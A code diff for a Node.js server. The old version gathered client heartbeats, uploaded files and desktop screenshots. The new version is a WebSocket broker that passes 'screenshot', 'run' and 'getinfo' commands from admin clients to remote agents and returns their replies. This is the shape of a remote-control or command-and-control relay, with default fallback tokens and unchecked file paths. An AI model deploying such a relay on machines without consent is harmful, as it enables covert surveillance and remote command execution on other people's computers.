@@ -1,183 +1,131 @@
-import express from "express";
-import fs from "fs";
-import path from "path";
-import { fileURLToPath } from "url";
+// Minimal Render-compatible WebSocket broker
+// Paths:
+//   /agent?token=...  -> Agent connections
+//   /admin?token=...  -> Admin client (your VB.NET Admin app)
+// Env:
+//   PORT (Render sets automatically)
+//   AGENT_TOKENS="token1,token2"
+//   ADMIN_TOKENS="admintoken1,admintoken2"
 
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
-
+const http = require("http");
+const express = require("express");
+const morgan = require("morgan");
+const WebSocket = require("ws");
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+app.use(morgan("dev"));
 
-app.use(express.json({ limit: "50mb" }));
+app.get("/", (req, res) => res.status(200).send("OK"));
+app.get("/healthz", (req, res) => res.status(200).json({ ok: true }));
 
-// --- online clients store (in-memory)
-const clients = {}; // { machineName: { user, machine, lastSeen: epochMillis, ip } }
+const PORT = process.env.PORT || 8080;
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ noServer: true });
 
-// --- heartbeat endpoint (client burada kendini bildirir)
-app.post('/heartbeat', (req, res) => {
-  try {
-    const { machine, user } = req.body || {};
+const AGENT_TOKENS = (process.env.AGENT_TOKENS || "agent1token").split(",");
+const ADMIN_TOKENS = (process.env.ADMIN_TOKENS || "admintoken").split(",");
 
-    if (!machine) return res.status(400).json({ error: "missing machine" });
+// state
+const agents = new Map(); // agentId -> { ws, info }
+const admins = new Set(); // Set<ws>
 
-    // IP tespiti: önce X-Forwarded-For başlığına bak, yoksa req.ip
-    let ip = null;
-    const xff = req.headers['x-forwarded-for'] || req.headers['x-forwarded-for'.toLowerCase()];
-    if (xff) {
-      // xff olabilir: "client, proxy1, proxy2" -> ilk eleman gerçek client IP
-      ip = String(xff).split(',')[0].trim();
-    } else if (req.ip) {
-      ip = req.ip;
-    } else if (req.connection && req.connection.remoteAddress) {
-      ip = req.connection.remoteAddress;
+// helpers
+function sendJson(ws, obj) {
+  try { ws.send(JSON.stringify(obj)); } catch (e) {}
+}
+function broadcastAdmins(obj) {
+  const s = JSON.stringify(obj);
+  for (const a of admins) {
+    if (a.readyState === WebSocket.OPEN) try { a.send(s); } catch {}
+  }
+}
+function parseQS(url) {
+  const q = url.split("?")[1] || "";
+  return new URLSearchParams(q);
+}
+
+// heartbeat (avoid idle timeouts)
+function installHeartbeat(ws) {
+  ws.isAlive = true;
+  ws.on("pong", () => (ws.isAlive = true));
+}
+setInterval(() => {
+  for (const ws of [...admins, ...[...agents.values()].map(x => x.ws)]) {
+    if (!ws) continue;
+    if (ws.isAlive === false) { try { ws.terminate(); } catch {} continue; }
+    ws.isAlive = false;
+    try { ws.ping(); } catch {}
+  }
+}, 30000);
+
+wss.on("connection", (ws, req) => {
+  installHeartbeat(ws);
+  const url = req.url || "/";
+  const isAgent = url.startsWith("/agent");
+  const isAdmin = url.startsWith("/admin");
+  const params = parseQS(url);
+  const token = params.get("token") || "";
+
+  if (isAgent) {
+    if (!AGENT_TOKENS.includes(token)) {
+      sendJson(ws, { type: "error", message: "unauthorized agent" });
+      return ws.close();
     }
+    ws.kind = "agent";
+    ws.agentId = null;
 
-    clients[machine] = {
-      machine,
-      user: user || null,
-      lastSeen: Date.now(),
-      ip: ip
-    };
+    ws.on("message", (buf) => {
+      let msg; try { msg = JSON.parse(buf.toString()); } catch { return; }
+      if (msg.type === "hello") {
+        ws.agentId = msg.agentId || ("agent-" + Math.random().toString(36).slice(2, 8));
+        agents.set(ws.agentId, { ws, info: msg });
+        broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
+      } else if (msg.type === "resp") {
+        // forward raw response to all admins (your VB admin filters by agentId if needed)
+        broadcastAdmins({ type: "resp", agentId: ws.agentId, payload: msg });
+      }
+    });
 
-    return res.json({ ok: true });
-  } catch (err) {
-    console.error('heartbeat err', err);
-    return res.status(500).json({ error: err.message });
-  }
-});
+    ws.on("close", () => {
+      if (ws.agentId && agents.has(ws.agentId)) {
+        agents.delete(ws.agentId);
+        broadcastAdmins({ type: "agent_list", agents: [...agents.keys()] });
+      }
+    });
 
-// --- online listing endpoint
-// query param `sinceSeconds` optional: consider clients seen within that many seconds (default 60)
-app.get('/online', (req, res) => {
-  try {
-    const sinceSeconds = parseInt(req.query.sinceSeconds || '60', 10);
-    const cutoff = Date.now() - (sinceSeconds * 1000);
-
-    const list = Object.values(clients)
-      .filter(c => c.lastSeen >= cutoff)
-      .map(c => ({
-        machine: c.machine,
-        user: c.user,
-        lastSeen: c.lastSeen,
-        lastSeenIso: new Date(c.lastSeen).toISOString(),
-        ip: c.ip || null
-      }));
-
-    return res.json(list);
-  } catch (err) {
-    return res.status(500).json({ error: err.message });
-  }
-});
-
-
-// Tüm dosyalar /tmp içinde tutulur (Render yazılabilir tek dizin)
-const baseDir = "/tmp";
-const uploadDir = path.join(baseDir, "uploads");
-if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
-
-/* -------------------------------------------
-   📤 1️⃣ Text dosyalarını alma (JSON kaydı)
--------------------------------------------- */
-app.post("/receive", (req, res) => {
-  try {
-    const data = req.body;
-    const fileName = data.fileName || "unknown.txt";
-    const savePath = path.join(baseDir, `${fileName}.json`);
-    fs.writeFileSync(savePath, JSON.stringify(data, null, 2), "utf8");
-    res.json({ status: "ok", saved: savePath });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-/* -------------------------------------------
-   🧾 2️⃣ Text dosyalarını listeleme
--------------------------------------------- */
-app.get("/list", (req, res) => {
-  try {
-    const files = fs.readdirSync(baseDir)
-      .filter(f => f.endsWith(".json"));
-    res.json(files);
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-/* -------------------------------------------
-   📥 3️⃣ Text dosyası indirme
--------------------------------------------- */
-app.get("/download/:fileName", (req, res) => {
-  try {
-    const filePath = path.join(baseDir, req.params.fileName);
-    if (!fs.existsSync(filePath)) {
-      return res.status(404).send("Dosya bulunamadı");
+  } else if (isAdmin) {
+    if (!ADMIN_TOKENS.includes(token)) {
+      sendJson(ws, { type: "error", message: "unauthorized admin" });
+      return ws.close();
     }
-    res.download(filePath);
-  } catch (err) {
-    res.status(500).send(err.message);
+    ws.kind = "admin";
+    admins.add(ws);
+    sendJson(ws, { type: "agent_list", agents: [...agents.keys()] });
+
+    ws.on("message", (buf) => {
+      let msg; try { msg = JSON.parse(buf.toString()); } catch { return; }
+      // expected: {type:'cmd', id:'uuid', cmd:'screenshot'|'run'|'getinfo', target:'agentId', ...}
+      if (msg.type === "cmd" && msg.target && msg.cmd) {
+        const entry = agents.get(msg.target);
+        if (entry && entry.ws.readyState === WebSocket.OPEN) {
+          sendJson(entry.ws, msg);
+        } else {
+          sendJson(ws, { type: "error", message: "agent not available" });
+        }
+      }
+    });
+
+    ws.on("close", () => { admins.delete(ws); });
+
+  } else {
+    sendJson(ws, { type: "error", message: "unknown path" });
+    ws.close();
   }
 });
 
-/* -------------------------------------------
-   🖼️ 4️⃣ Fotoğraf yükleme (masaüstünden gelen)
--------------------------------------------- */
-app.post("/upload", (req, res) => {
-  try {
-    const { fileName, fileData, fileType } = req.body;
-    if (!fileName || !fileData) {
-      return res.status(400).json({ error: "Eksik veri gönderildi." });
-    }
-
-    const savePath = path.join(uploadDir, fileName);
-    const buffer = Buffer.from(fileData, "base64");
-    fs.writeFileSync(savePath, buffer);
-
-    res.json({ status: "ok", saved: savePath });
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
+server.on("upgrade", (req, socket, head) => {
+  // accept WS for both /agent and /admin paths
+  wss.handleUpgrade(req, socket, head, (ws) => wss.emit("connection", ws, req));
 });
 
-/* -------------------------------------------
-   🧾 5️⃣ Sunucudaki fotoğrafları listeleme
--------------------------------------------- */
-app.get("/listImages", (req, res) => {
-  try {
-    const files = fs.readdirSync(uploadDir)
-      .filter(f =>
-        f.endsWith(".jpg") ||
-        f.endsWith(".jpeg") ||
-        f.endsWith(".png") ||
-        f.endsWith(".bmp") ||
-        f.endsWith(".gif")
-      );
-    res.json(files);
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-/* -------------------------------------------
-   📥 6️⃣ Fotoğraf indirme
--------------------------------------------- */
-app.get("/downloadImage/:fileName", (req, res) => {
-  try {
-    const filePath = path.join(uploadDir, req.params.fileName);
-    if (!fs.existsSync(filePath)) {
-      return res.status(404).send("Fotoğraf bulunamadı");
-    }
-    res.download(filePath);
-  } catch (err) {
-    res.status(500).send(err.message);
-  }
-});
-
-/* -------------------------------------------
-   🚀 Sunucuyu başlat
--------------------------------------------- */
-app.listen(PORT, () => console.log(`✅ Server ${PORT} portunda çalışıyor`));
-
-
+server.listen(PORT, () => console.log("WS broker listening on", PORT));
